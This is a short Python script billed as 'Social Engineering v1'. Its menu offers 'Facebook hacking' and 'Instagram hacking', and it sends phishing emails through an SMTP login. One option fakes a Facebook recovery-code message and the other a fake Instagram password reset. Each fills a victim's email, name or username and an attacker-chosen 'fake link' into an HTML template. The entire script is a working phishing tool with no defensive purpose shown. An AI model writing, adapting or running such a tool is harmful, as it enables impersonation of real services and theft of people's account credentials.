from smtplib import SMTP
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

display = """
                   #######################################################
                   #               Social Engineering v1                 #
                   #######################################################
                   #                                                     #
                   #	           1.Facebook hacking                    #
                   #               2.Instagram hacking                   #
                   #                                                     #
                   #######################################################
"""
while True:
	print(display)
	input_oprt = input("                   >> ")
	if len(input_oprt) == 0 or len(input_oprt) > 1 or int(input_oprt) > 2:
		print("                   Something went wrong")
	elif int(input_oprt) == 1:
		display2 = """
                   #######################################################
                   #               Social Engineering v1                 #
                   #######################################################
                   #                                                     #
                   #	           1.Facebook hacking                    #
                   #                                                     #
                   #######################################################
"""		
		print(display2)
		try:
			host = input('                   Host >> ')
			port = int(input('                   Port >> '))
			email = input('                   Mail >> ')
			password = input('                   Pass >> ')
			connect_server = SMTP(host,port)
			connect_server.ehlo()
			connect_server.starttls()
			connect_server.login(email,password)
			recovery_key = int(input('                   Fake recovery key >> '))
			message = MIMEMultipart('alternative')
			subject = '{key} is your Facebook account recovery code'.format(key = recovery_key)
			message['subject'] = subject
			message['from'] = email
			victim_mail = input('                   Victim mail >> ')
			message['to'] = victim_mail
			link = input("                   Fake link >> ")
			name = input("                   Victim name >> ")
			html_file = open('facebook.txt','r')
			body = html_file.read()
			body = body.format(link = link,name = name,to_mail = victim_mail,key = recovery_key)
			html_text = MIMEText(body,'html')
			message.attach(html_text)
			connect_server.sendmail(email,victim_mail,message.as_string())
			print("                   Message sent!")
		except:
		 	print("                   Wrong something!")
		finally:
			connect_server.quit()
			print("                   Disconnected from server!")
	elif int(input_oprt) == 2:
		display3 = """
                   #######################################################
                   #               Social Engineering v1                 #
                   #######################################################
                   #                                                     #
                   #	           1.Instagram hacking                   #
                   #                                                     #
                   #######################################################
"""
		print(display3)
		try:
			host = input('                   Host >> ')
			port = int(input('                   Port >> '))
			email = input('                   Mail >> ')
			password = input('                   Pass >> ')
			connect_server = SMTP(host,port)
			connect_server.ehlo()
			connect_server.starttls()
			connect_server.login(email,password)
			subject = 'Reset Your Password'
			messages = MIMEMultipart('alternative')
			messages['subject'] = subject
			messages['from'] = email
			victim_mail = input('                   Victim mail >> ')
			messages['to'] = victim_mail
			with open('instagram.txt','r') as htmlfile:
				html_text = htmlfile.read()
			victim_username = input('                   Victim username >>')
			instagramLink = input("                   Fake link >> ")
			html_text = html_text.format(username = victim_username,link = instagramLink,mail = victim_mail)
			html_mesg = MIMEText(html_text,'html')
			messages.attach(html_mesg)
			connect_server.sendmail(email,victim_mail,messages.as_string())
			print('                   Message sent!')
		except:
		 	print("                   Wrong something!")
		finally:
			connect_server.quit()
			print('                   Disconnected from server!')